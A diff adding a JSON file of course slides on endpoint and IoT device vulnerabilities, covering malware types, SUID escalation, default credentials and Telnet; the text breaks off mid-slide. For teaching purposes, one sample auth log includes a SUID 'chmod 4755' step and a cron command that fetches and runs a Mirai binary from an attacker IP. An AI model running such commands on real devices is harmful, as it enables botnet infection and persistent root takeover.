@@ -1,0 +1,1838 @@
+{
+ "subunit_id": "4.1",
+ "subunit_title": "Device Endpoint Vulnerabilities",
+ "unit": "4",
+ "unit_title": "Unit 4: Securing Devices",
+ "learning_objectives": [],
+ "slides": [
+  {
+   "index": "4.1.1.a.1",
+   "parent_n": 1,
+   "title": "Endpoints: Where Security Meets Hardware",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "endpoint",
+    "attack-surface",
+    "foundations"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NIST SP 800-128 defines an endpoint as any device connecting to an enterprise network; Endpoint Detection and Response (EDR) tooling specifically targets this layer.</p><p><b>Analogy:</b> If the network is a fortress's walls and gates, the endpoint is the door of an individual room inside, the wall can be perfect and a single unlocked door still lets someone in.</p><p><b>Exam tip:</b> When a scenario names a specific device (laptop, camera, router), the exam is usually testing endpoint-layer vocabulary, not network-layer vocabulary.</p>",
+   "beat": 1,
+   "bullets": [
+    "Endpoint: any device used directly by a person/process, laptops, phones, servers, IoT",
+    "The place where network-security abstractions (firewalls, tunnels) terminate at real hardware",
+    "Most frequently attacked layer because humans and software directly interact with data there",
+    "NIST SP 800-128 defines endpoint as any device connecting to an enterprise network"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.1",
+   "parent_n": 1,
+   "title": "Endpoints: Where Security Meets Hardware",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "endpoint",
+    "attack-surface",
+    "foundations"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NIST SP 800-128 defines an endpoint as any device connecting to an enterprise network; Endpoint Detection and Response (EDR) tooling specifically targets this layer.</p><p><b>Analogy:</b> If the network is a fortress's walls and gates, the endpoint is the door of an individual room inside, the wall can be perfect and a single unlocked door still lets someone in.</p><p><b>Exam tip:</b> When a scenario names a specific device (laptop, camera, router), the exam is usually testing endpoint-layer vocabulary, not network-layer vocabulary.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>An <b>endpoint</b> is any device that sits at the 'end' of a network connection and is used directly by a person or process, laptops, desktops, smartphones, servers, and IoT devices like cameras or thermostats. Endpoints are where humans and software actually interact with data, which makes them the most frequently attacked layer of any network.</p>",
+    "<p>This topic examines the device itself as the target: what makes an operating system, firmware, or an embedded controller inherently exploitable, and how adversaries convert a single compromised endpoint into a foothold for the rest of the network.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.2",
+   "parent_n": 2,
+   "title": "Attack Surface: Counting the Doors",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "attack-surface",
+    "hardening",
+    "foundations"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Formalized by Manadhata &amp; Wing (2011), 'An Attack Surface Metric,' IEEE Transactions on Software Engineering. Codified as NIST SP 800-53 control family CM (Configuration Management).</p><p><b>Analogy:</b> A house with ten unlocked windows is riskier than one with two, even if both have the same locked front door.</p><p><b>Misconception:</b> A bigger, more feature-rich device is not inherently 'more secure', every added feature is usually added surface.</p>",
+   "beat": 1,
+   "bullets": [
+    "Attack surface: the complete set of entry/exfiltration points on a system",
+    "Every open port, running service, installed app, user account, physical interface counts",
+    "More surface = more places for something to go wrong",
+    "Endpoint security = minimizing surface (hardening) + assuming breach (defense in depth)"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.2",
+   "parent_n": 2,
+   "title": "Attack Surface: Counting the Doors",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "attack-surface",
+    "hardening",
+    "foundations"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Formalized by Manadhata &amp; Wing (2011), 'An Attack Surface Metric,' IEEE Transactions on Software Engineering. Codified as NIST SP 800-53 control family CM (Configuration Management).</p><p><b>Analogy:</b> A house with ten unlocked windows is riskier than one with two, even if both have the same locked front door.</p><p><b>Misconception:</b> A bigger, more feature-rich device is not inherently 'more secure', every added feature is usually added surface.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The academic frame for endpoint vulnerability is <b>attack surface</b>, the complete set of points where an unauthorized user could try to enter or extract data from a system. Every running service, open network port, installed application, and default account on a device is a potential entry point.</p>",
+    "<p>Endpoint security, as a discipline, is the practice of systematically minimizing that surface (hardening) while simultaneously assuming that some component of it will eventually be breached (defense in depth), and building detection capability around that assumption.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.3",
+   "parent_n": 3,
+   "title": "Two Questions to Classify Any Malware Sample",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "malware",
+    "classification",
+    "foundations"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NIST SP 800-83 Rev. 1, 'Guide to Malware Incident Prevention and Handling,' is the canonical federal reference for malware taxonomy.</p><p><b>Misconception:</b> Students try to memorize malware types as a flat list instead of asking these two questions, which makes scenario questions hard to answer.</p><p><b>Exam tip:</b> Always separate 'how it got in / how it spreads' from 'what it does once inside' when labeling a scenario.</p>",
+   "beat": 1,
+   "bullets": [
+    "Question 1: How does it get onto the device? (infection vector)",
+    "Question 2: How does it propagate/persist once there? (behavioral classification)",
+    "These are independent dimensions, a single sample can satisfy several labels at once",
+    "Malware = any program intentionally written to damage, disrupt, spy on, or gain unauthorized access"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.3",
+   "parent_n": 3,
+   "title": "Two Questions to Classify Any Malware Sample",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "malware",
+    "classification",
+    "foundations"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NIST SP 800-83 Rev. 1, 'Guide to Malware Incident Prevention and Handling,' is the canonical federal reference for malware taxonomy.</p><p><b>Misconception:</b> Students try to memorize malware types as a flat list instead of asking these two questions, which makes scenario questions hard to answer.</p><p><b>Exam tip:</b> Always separate 'how it got in / how it spreads' from 'what it does once inside' when labeling a scenario.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Malware</b> (malicious software) is the primary payload category deployed once an endpoint vulnerability has been located. Understanding malware requires separating two independent questions students frequently conflate: <b>how does it get onto the device</b> (the infection vector, phishing, drive-by download, USB, network exploit) and <b>how does it propagate and persist once there</b> (the behavioral classification).</p>",
+    "<p>A single sample of malware is often described using several classifications simultaneously, because they describe different dimensions of behavior rather than mutually exclusive categories.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.4",
+   "parent_n": 4,
+   "title": "Virus vs. Worm vs. Trojan: Infection Mechanisms",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "malware",
+    "virus",
+    "worm",
+    "trojan"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Cohen, F. (1987), 'Computer Viruses: Theory and Experiments,' formally defined computer viruses as self-replicating code. The 1988 Morris Worm was the first internet worm and prompted the creation of the first CERT.</p><p><b>Analogy:</b> A virus is like a biological virus needing a host cell; a worm is autonomous like a self-driving vehicle; a trojan is the Greek myth, a gift that hides an attacker inside.</p><p><b>Exam tip:</b> If a scenario says 'no user interaction was required and it spread across the network on its own,' that is a worm, not a virus.</p>",
+   "beat": 1,
+   "bullets": [
+    "Virus: attaches to a host file, requires human execution to activate and spread",
+    "Worm: self-replicating, network-aware, spreads with zero user interaction",
+    "Trojan: disguised as legitimate software, relies entirely on deception, does not self-replicate",
+    "Key distinction: worms are autonomous, viruses are parasitic, trojans are deceptive"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.4",
+   "parent_n": 4,
+   "title": "Virus vs. Worm vs. Trojan: Infection Mechanisms",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "malware",
+    "virus",
+    "worm",
+    "trojan"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Cohen, F. (1987), 'Computer Viruses: Theory and Experiments,' formally defined computer viruses as self-replicating code. The 1988 Morris Worm was the first internet worm and prompted the creation of the first CERT.</p><p><b>Analogy:</b> A virus is like a biological virus needing a host cell; a worm is autonomous like a self-driving vehicle; a trojan is the Greek myth, a gift that hides an attacker inside.</p><p><b>Exam tip:</b> If a scenario says 'no user interaction was required and it spread across the network on its own,' that is a worm, not a virus.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>A <b>virus</b> requires a host file and human execution to activate and propagate; it inserts its code into legitimate executables or documents (macro viruses). A <b>worm</b> is self-propagating and network-aware, it does not need a host file or user interaction, autonomously scanning for and exploiting vulnerable services. A <b>trojan</b> is disguised as legitimate software; unlike a virus or worm, it does NOT self-replicate, relying entirely on social engineering to convince the user to run it once.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.5",
+   "parent_n": 5,
+   "title": "Ransomware and Rootkit: Objectives, Not Vectors",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "malware",
+    "ransomware",
+    "rootkit"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Ransomware-as-a-Service (RaaS) groups like LockBit and BlackCat/ALPHV lease encryption toolkits to affiliates for a cut of the ransom. FBI IC3 2023: reported ransomware losses exceeded $59.6 million. Kernel-mode rootkits (ring 0) and firmware/bootkit rootkits (e.g., LoJax, 2018) can survive a full disk wipe.</p><p><b>Misconception:</b> Paying a ransom does not guarantee data recovery or that exfiltrated data won't still be leaked.</p><p><b>Exam tip:</b> 'Hides from the OS itself, even Task Manager shows nothing wrong' is the rootkit signature phrase.</p>",
+   "beat": 1,
+   "bullets": [
+    "Ransomware: encrypts victim data, extorts payment for the decryption key",
+    "Double extortion: exfiltrate data first, threaten to publish even if backups exist",
+    "Rootkit: gains AND conceals privileged ('root') access, hides from OS-level tools",
+    "Kernel-mode and firmware/bootkit rootkits are especially hard to detect and remove"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.5",
+   "parent_n": 5,
+   "title": "Ransomware and Rootkit: Objectives, Not Vectors",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "malware",
+    "ransomware",
+    "rootkit"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Ransomware-as-a-Service (RaaS) groups like LockBit and BlackCat/ALPHV lease encryption toolkits to affiliates for a cut of the ransom. FBI IC3 2023: reported ransomware losses exceeded $59.6 million. Kernel-mode rootkits (ring 0) and firmware/bootkit rootkits (e.g., LoJax, 2018) can survive a full disk wipe.</p><p><b>Misconception:</b> Paying a ransom does not guarantee data recovery or that exfiltrated data won't still be leaked.</p><p><b>Exam tip:</b> 'Hides from the OS itself, even Task Manager shows nothing wrong' is the rootkit signature phrase.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Ransomware</b> encrypts a victim's files (or locks their system) and demands payment, usually cryptocurrency, for the decryption key. Modern groups also exfiltrate data first and threaten to publish it even if the victim has backups, a tactic called 'double extortion.' A <b>rootkit</b> is a toolkit designed to gain and maintain privileged access while actively hiding its own presence, from the file system, running-process lists, and even the OS kernel itself.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.5",
+   "parent_n": 5,
+   "title": "Ransomware and Rootkit: Objectives, Not Vectors",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "malware",
+    "ransomware",
+    "rootkit"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Ransomware-as-a-Service (RaaS) groups like LockBit and BlackCat/ALPHV lease encryption toolkits to affiliates for a cut of the ransom. FBI IC3 2023: reported ransomware losses exceeded $59.6 million. Kernel-mode rootkits (ring 0) and firmware/bootkit rootkits (e.g., LoJax, 2018) can survive a full disk wipe.</p><p><b>Misconception:</b> Paying a ransom does not guarantee data recovery or that exfiltrated data won't still be leaked.</p><p><b>Exam tip:</b> 'Hides from the OS itself, even Task Manager shows nothing wrong' is the rootkit signature phrase.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "img_4.1.1_malware_taxonomy",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.6",
+   "parent_n": 6,
+   "title": "Privilege Escalation: From Foothold to Full Control",
+   "slide_type": "mechanism",
+   "difficulty": "foundational",
+   "tags": [
+    "privilege-escalation",
+    "least-privilege"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> MITRE ATT&amp;CK Tactic TA0004. CWE-269, 'Improper Privilege Management,' catalogs common root causes. Principle of least privilege formalized by Saltzer &amp; Schroeder (1975); codified as NIST SP 800-53 control AC-6.</p><p><b>Analogy:</b> A hotel keycard that only opens your room's door (least privilege) vs. a master key an attacker must steal or forge (escalation).</p><p><b>Exam tip:</b> Distinguish vertical (up the privilege ladder) from horizontal (sideways to a peer's data) escalation explicitly if asked.</p>",
+   "beat": 1,
+   "bullets": [
+    "Privilege escalation: exploiting a flaw/misconfig to gain rights beyond what was granted",
+    "Vertical escalation: standard user → admin/root",
+    "Horizontal escalation: accessing another equally-privileged user's data",
+    "Least privilege means attackers almost never land with full access, they must escalate"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.6",
+   "parent_n": 6,
+   "title": "Privilege Escalation: From Foothold to Full Control",
+   "slide_type": "mechanism",
+   "difficulty": "foundational",
+   "tags": [
+    "privilege-escalation",
+    "least-privilege"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> MITRE ATT&amp;CK Tactic TA0004. CWE-269, 'Improper Privilege Management,' catalogs common root causes. Principle of least privilege formalized by Saltzer &amp; Schroeder (1975); codified as NIST SP 800-53 control AC-6.</p><p><b>Analogy:</b> A hotel keycard that only opens your room's door (least privilege) vs. a master key an attacker must steal or forge (escalation).</p><p><b>Exam tip:</b> Distinguish vertical (up the privilege ladder) from horizontal (sideways to a peer's data) escalation explicitly if asked.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Privilege escalation</b> is the deliberate exploitation of a flaw or misconfiguration to convert an initial low-privilege foothold into administrative control. Because most endpoint operating systems apply the <b>principle of least privilege</b> to newly-created accounts by default, attackers who compromise a low-value account (e.g., via phishing) must still escalate before they can install persistent malware, disable security tooling, or move laterally to higher-value systems.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.7",
+   "parent_n": 7,
+   "title": "IoT Devices: A Uniquely Exploitable Endpoint Class",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "iot",
+    "embedded-systems"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NISTIR 8228, 'Considerations for Managing IoT Cybersecurity and Privacy Risks,' identifies IoT devices as uniquely difficult to secure because they often cannot run traditional endpoint agents due to limited compute resources.</p><p><b>Misconception:</b> 'It's just a camera, not a computer', any IoT device with an OS and network stack is a full endpoint from an attacker's perspective.</p><p><b>Exam tip:</b> IoT-specific answers should mention BOTH resource constraints AND default-credential/patch-cadence problems.</p>",
+   "beat": 1,
+   "bullets": [
+    "IoT: embedded, network-connected everyday devices (cameras, thermostats, locks, sensors)",
+    "Manufacturers often prioritize cost/time-to-market over security engineering",
+    "Limited compute resources often prevent running traditional AV/EDR agents",
+    "Infrequent or nonexistent firmware updates + undocumented default credentials"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.7",
+   "parent_n": 7,
+   "title": "IoT Devices: A Uniquely Exploitable Endpoint Class",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "iot",
+    "embedded-systems"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NISTIR 8228, 'Considerations for Managing IoT Cybersecurity and Privacy Risks,' identifies IoT devices as uniquely difficult to secure because they often cannot run traditional endpoint agents due to limited compute resources.</p><p><b>Misconception:</b> 'It's just a camera, not a computer', any IoT device with an OS and network stack is a full endpoint from an attacker's perspective.</p><p><b>Exam tip:</b> IoT-specific answers should mention BOTH resource constraints AND default-credential/patch-cadence problems.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>An increasingly significant category of endpoint is the <b>Internet of Things (IoT)</b> device: an embedded system, typically running a stripped-down Linux distribution, with limited compute resources, infrequent (or nonexistent) firmware update mechanisms, and, critically, factory-set default credentials that are rarely changed by end users or even documented for customers to change.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.8",
+   "parent_n": 8,
+   "title": "Section I Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": {
+    "question": "A piece of malware disguises itself as a free game download, and once run, encrypts the victim's files for ransom. Which TWO classifications correctly apply?",
+    "choices": [
+     "Worm; Rootkit",
+     "Trojan; Ransomware",
+     "Virus; Spyware",
+     "Worm; Virus"
+    ],
+    "answer": "Trojan; Ransomware",
+    "explanation": "It relies on deception to get executed (trojan = infection vector) and its objective is to encrypt and extort (ransomware = objective)."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Before Section II applies these terms to a real log, be able to define each term in one sentence without notes, free-response graders reward precise vocabulary over paraphrase.</p>",
+   "beat": 1,
+   "bullets": [
+    "Endpoint, Attack Surface, Malware, Virus, Worm, Trojan",
+    "Ransomware, Rootkit, Privilege Escalation, Least Privilege, IoT",
+    "Two-question malware framework: infection vector + behavioral objective",
+    "All terms trace to a specific NIST/academic source cited in this section"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.1.a.8",
+   "parent_n": 8,
+   "title": "Section I Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": {
+    "question": "A piece of malware disguises itself as a free game download, and once run, encrypts the victim's files for ransom. Which TWO classifications correctly apply?",
+    "choices": [
+     "Worm; Rootkit",
+     "Trojan; Ransomware",
+     "Virus; Spyware",
+     "Worm; Virus"
+    ],
+    "answer": "Trojan; Ransomware",
+    "explanation": "It relies on deception to get executed (trojan = infection vector) and its objective is to encrypt and extort (ransomware = objective)."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Before Section II applies these terms to a real log, be able to define each term in one sentence without notes, free-response graders reward precise vocabulary over paraphrase.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Section I recap:</b> An <i>endpoint</i> is any directly-used device; its <i>attack surface</i> is every entry point on it. <i>Malware</i> splits into infection-vector types (virus, worm, trojan) and objective types (ransomware, rootkit, and others like spyware). <i>Privilege escalation</i> converts a low-privilege foothold into administrative control, which matters because of the <i>least privilege</i> principle. <i>IoT</i> devices are a distinct, uniquely exploitable endpoint class due to resource constraints and poor default configuration hygiene.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.1",
+   "parent_n": 9,
+   "title": "Default Credentials at Internet Scale",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "default-credentials",
+    "shodan",
+    "reconnaissance"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Shodan (founded by John Matherly, 2009) indexes metadata about every publicly reachable device rather than web pages. The Mirai botnet source code (leaked 2016) hardcoded 61 common IoT default credential pairs.</p><p><b>Analogy:</b> Instead of trying every doorknob on a street by hand, the attacker uses a directory of which doors are unlocked, published for them in advance.</p><p><b>Exam tip:</b> 'Attackers scanned the entire internet for a specific open port/service' is a Shodan-style reconnaissance signature.</p>",
+   "beat": 1,
+   "bullets": [
+    "Default admin passwords: factory-preset username/password, meant to be changed, rarely is",
+    "Mirai's leaked source code hardcoded 61 common IoT default credential pairs",
+    "Attackers use mass scanners (Shodan, masscan) to fingerprint device banners at scale",
+    "Matching hosts are fed into automated credential-stuffing scripts, no manual targeting"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.1",
+   "parent_n": 9,
+   "title": "Default Credentials at Internet Scale",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "default-credentials",
+    "shodan",
+    "reconnaissance"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Shodan (founded by John Matherly, 2009) indexes metadata about every publicly reachable device rather than web pages. The Mirai botnet source code (leaked 2016) hardcoded 61 common IoT default credential pairs.</p><p><b>Analogy:</b> Instead of trying every doorknob on a street by hand, the attacker uses a directory of which doors are unlocked, published for them in advance.</p><p><b>Exam tip:</b> 'Attackers scanned the entire internet for a specific open port/service' is a Shodan-style reconnaissance signature.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>To understand why default administrator passwords remain such an effective attack vector at internet scale, examine how automated scanning and credential-stuffing tools operate. Adversaries do not manually test devices one at a time; they run mass internet scanners such as <b>Shodan</b> or custom masscan-based tooling that fingerprint device banners on common ports, then feed matching hosts into automated credential-stuffing scripts.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.2",
+   "parent_n": 10,
+   "title": "Reading a Compromise: Auth Log Walkthrough",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "auth-log",
+    "brute-force",
+    "suid"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CWE-272, 'Least Privilege Violation,' and MITRE ATT&amp;CK T1548.001 (Setuid and Setgid) formally document the SUID persistence technique.</p><p><b>Misconception:</b> Students sometimes think the login attempt count matters more than the timing, it's the sub-second spacing between failures that signals automation, not just the number of failures.</p><p><b>Exam tip:</b> Always narrate a log left to right: vector → success → escalation → persistence/payload, in that order.</p>",
+   "beat": 1,
+   "bullets": [
+    "4 rapid Failed password attempts from same IP = scripted brute force, not human typing",
+    "5th attempt Accepted password for admin = credential-stuffing success",
+    "sudo chmod 4755 on /bin/busybox = SUID escalation for persistent root access",
+    "cron job downloads mirai.arm = enrollment into a Mirai-family IoT botnet"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.2",
+   "parent_n": 10,
+   "title": "Reading a Compromise: Auth Log Walkthrough",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "auth-log",
+    "brute-force",
+    "suid"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CWE-272, 'Least Privilege Violation,' and MITRE ATT&amp;CK T1548.001 (Setuid and Setgid) formally document the SUID persistence technique.</p><p><b>Misconception:</b> Students sometimes think the login attempt count matters more than the timing, it's the sub-second spacing between failures that signals automation, not just the number of failures.</p><p><b>Exam tip:</b> Always narrate a log left to right: vector → success → escalation → persistence/payload, in that order.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The chapter's authentication log excerpt shows a full compromise chain: source IP <code>198.51.100.12</code> attempts a small number of common username/password combinations (four failed logons in rapid succession, a signature of scripted brute forcing), succeeds on the fifth attempt against the <code>admin</code> account, sets the SUID bit on <code>/bin/busybox</code> via <code>chmod 4755</code>, then a cron job downloads and executes <code>mirai.arm</code>.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.2",
+   "parent_n": 10,
+   "title": "Reading a Compromise: Auth Log Walkthrough",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "auth-log",
+    "brute-force",
+    "suid"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CWE-272, 'Least Privilege Violation,' and MITRE ATT&amp;CK T1548.001 (Setuid and Setgid) formally document the SUID persistence technique.</p><p><b>Misconception:</b> Students sometimes think the login attempt count matters more than the timing, it's the sub-second spacing between failures that signals automation, not just the number of failures.</p><p><b>Exam tip:</b> Always narrate a log left to right: vector → success → escalation → persistence/payload, in that order.</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "mode": "static",
+    "content": "Jun 12 03:14:02 iot-cam-42 sshd[1188]: Failed password for admin from 198.51.100.12 port 51422 ssh2\nJun 12 03:14:03 iot-cam-42 sshd[1188]: Failed password for admin from 198.51.100.12 port 51423 ssh2\nJun 12 03:14:04 iot-cam-42 sshd[1188]: Failed password for root from 198.51.100.12 port 51424 ssh2\nJun 12 03:14:05 iot-cam-42 sshd[1188]: Accepted password for admin from 198.51.100.12 port 51425 ssh2\nJun 12 03:14:06 iot-cam-42 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod 4755 /bin/busybox\nJun 12 03:14:07 iot-cam-42 kernel: audit: SUID bit set on /bin/busybox by uid=1000\nJun 12 03:14:10 iot-cam-42 cron[1204]: (admin) CMD (wget http://198.51.100.12/mirai.arm -O /tmp/.update; chmod +x /tmp/.update; /tmp/.update)"
+   }
+  },
+  {
+   "index": "4.1.2.a.3",
+   "parent_n": 11,
+   "title": "The SUID Bit: A Persistence Trick",
+   "slide_type": "mechanism",
+   "difficulty": "advanced",
+   "tags": [
+    "suid",
+    "privilege-escalation",
+    "persistence"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CWE-272 and MITRE ATT&amp;CK T1548.001 document this technique formally.</p><p><b>Analogy:</b> It's like an employee badge that was set to always open the CEO's office regardless of who is holding it, the door checks the badge's permission level, not the person.</p><p><b>Exam tip:</b> 'SUID bit set on a binary' in a log is a high-severity persistence indicator, not just an access event.</p>",
+   "beat": 1,
+   "bullets": [
+    "SUID (Set User ID): program runs with the FILE OWNER's privileges, not the invoker's",
+    "chmod 4755 sets SUID (leading '4') + rwxr-xr-x permissions",
+    "If root owns the binary, ANY user who executes it temporarily runs as root",
+    "Classic embedded-Linux persistence: attacker regains root anytime by invoking that binary"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.3",
+   "parent_n": 11,
+   "title": "The SUID Bit: A Persistence Trick",
+   "slide_type": "mechanism",
+   "difficulty": "advanced",
+   "tags": [
+    "suid",
+    "privilege-escalation",
+    "persistence"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CWE-272 and MITRE ATT&amp;CK T1548.001 document this technique formally.</p><p><b>Analogy:</b> It's like an employee badge that was set to always open the CEO's office regardless of who is holding it, the door checks the badge's permission level, not the person.</p><p><b>Exam tip:</b> 'SUID bit set on a binary' in a log is a high-severity persistence indicator, not just an access event.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The <b>SUID bit</b> is a special Unix/Linux file permission flag that causes a program to run with the file owner's privileges rather than the privileges of the user who launched it. If a program owned by root has the SUID bit set, any user who executes it temporarily runs with root privileges for that execution. Attackers who gain limited access frequently set the SUID bit on a shell or utility binary as an easy way to regain root access later, even after their original credentials are revoked.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.4",
+   "parent_n": 12,
+   "title": "Telnet: Plaintext Remote Administration",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "telnet",
+    "plaintext",
+    "ssh"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> RFC 854 defines Telnet (1983). NIST SP 800-53 control CM-7 (Least Functionality) flags Telnet as an unnecessary and dangerous open service that should be disabled by default.</p><p><b>Misconception:</b> A closed network is not automatically a safe one to run Telnet on, any device on that same local segment, including a compromised one, can sniff it.</p><p><b>Exam tip:</b> Port 23 open = immediate red flag; pair it with 'SSH (22) disabled' for full credit on hardening questions.</p>",
+   "beat": 1,
+   "bullets": [
+    "Telnet (1969, RFC 854): transmits ALL data, including credentials, unencrypted",
+    "Frequently left enabled on IoT firmware for factory diagnostics, never disabled before shipping",
+    "Any attacker on the network path can harvest credentials directly from the wire",
+    "SSH created specifically to replace Telnet by adding encryption"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.4",
+   "parent_n": 12,
+   "title": "Telnet: Plaintext Remote Administration",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "telnet",
+    "plaintext",
+    "ssh"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> RFC 854 defines Telnet (1983). NIST SP 800-53 control CM-7 (Least Functionality) flags Telnet as an unnecessary and dangerous open service that should be disabled by default.</p><p><b>Misconception:</b> A closed network is not automatically a safe one to run Telnet on, any device on that same local segment, including a compromised one, can sniff it.</p><p><b>Exam tip:</b> Port 23 open = immediate red flag; pair it with 'SSH (22) disabled' for full credit on hardening questions.</p>",
